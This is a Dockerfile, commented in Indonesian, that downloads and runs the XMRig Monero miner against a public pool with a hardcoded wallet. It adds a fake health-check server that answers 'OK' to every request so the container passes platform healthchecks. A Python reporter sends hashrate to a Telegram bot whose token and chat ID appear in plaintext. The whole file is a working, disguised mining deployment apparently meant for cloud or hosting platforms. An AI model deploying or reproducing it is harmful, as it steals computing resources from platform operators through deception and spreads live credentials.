FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
    apt-get install -y wget tar ca-certificates python3 python3-requests curl procps && \
    rm -rf /var/lib/apt/lists/* && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && \
    tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz && \
    rm xmrig-6.22.2-linux-static-x64.tar.gz

# Reporter Python: Health check server (listen di $PORT atau 8080) + Telegram hashrate reporter
RUN cat << 'EOF' > /reporter.py
import time
import requests
import http.server
import socketserver
import os
import threading

TOKEN = "9200373511:AAE7lDnzL7joTavno-9VeIR1316HRZZc7YE"
CHAT_ID = "8949644128"
RIG = "sal909"

try:
    NODE_ID = open("/proc/sys/kernel/random/uuid").read().strip()[:4]
except Exception:
    import random
    NODE_ID = str(random.randint(1000, 9999))

# Health Server: Listen di $PORT (default 8080) agar lolos healthcheck Watasu/K8s
port_env = os.environ.get("PORT", "8080")
try:
    PORT = int(port_env)
except Exception:
    PORT = 8080

class RobustHealthHandler(http.server.BaseHTTPRequestHandler):
    def _respond(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"OK")
    def do_GET(self):
        self._respond()
    def do_HEAD(self):
        self._respond()
    def do_POST(self):
        self._respond()
    def do_OPTIONS(self):
        self._respond()
    def log_message(self, format, *args):
        pass

socketserver.TCPServer.allow_reuse_address = True

def run_health_server():
    try:
        with socketserver.TCPServer(("0.0.0.0", PORT), RobustHealthHandler) as httpd:
            httpd.serve_forever()
    except Exception as e:
        print(f"Health server note: {e}")

threading.Thread(target=run_health_server, daemon=True).start()

def send_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception:
        pass

send_msg(f"🟢 <b>Worker Aktif:</b> <code>{RIG}</code> (Node #{NODE_ID})\n🚀 Siap menambang & monitoring hashrate aktif...")
time.sleep(30)

while True:
    try:
        r = requests.get("http://127.0.0.1:4044/1/summary", timeout=5).json()
        hr = r.get("hashrate", {}).get("total", [0, 0, 0])
        good = r.get("results", {}).get("shares_good", 0)
        total = r.get("results", {}).get("shares_total", 0)
        uptime = r.get("uptime", 0) // 60
        h10s = f"{hr[0]:.2f}" if hr[0] else "0.00"
        h60s = f"{hr[1]:.2f}" if hr[1] else "0.00"
        h15m = f"{hr[2]:.2f}" if hr[2] else "0.00"
        send_msg(
            f"⛏ <b>[Hashrate: {RIG} #{NODE_ID}]</b>\n"
            f"⚡ 10s: <code>{h10s} H/s</code> | 60s: <code>{h60s} H/s</code> | 15m: <code>{h15m} H/s</code>\n"
            f"✅ Shares: <code>{good}/{total}</code> | ⏱ Uptime: <code>{uptime} menit</code>"
        )
    except Exception:
        pass
    time.sleep(180) # Lapor hashrate setiap 3 menit
EOF

# Entrypoint script: Jalankan reporter di background + xmrig keepalive dengan RandomX Light Mode
RUN cat << 'EOF' > /entrypoint.sh
#!/bin/bash
python3 /reporter.py &
cd /xmrig-6.22.2
while true; do
    echo "[keepalive] Menjalankan xmrig (RandomX Light Mode)..."
    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 \
        -u USDT:0x098f58db447351f5433006b7761b9da8d8a26680.sal909 \
        -p x --tls --randomx-mode=light --threads=2 --cpu-no-yield --randomx-no-numa \
        --keepalive \
        --http-host=127.0.0.1 --http-port=4044
    sleep 3
done
EOF

RUN chmod +x /entrypoint.sh

EXPOSE 8080 80 4044

CMD ["/bin/bash", "/entrypoint.sh"]
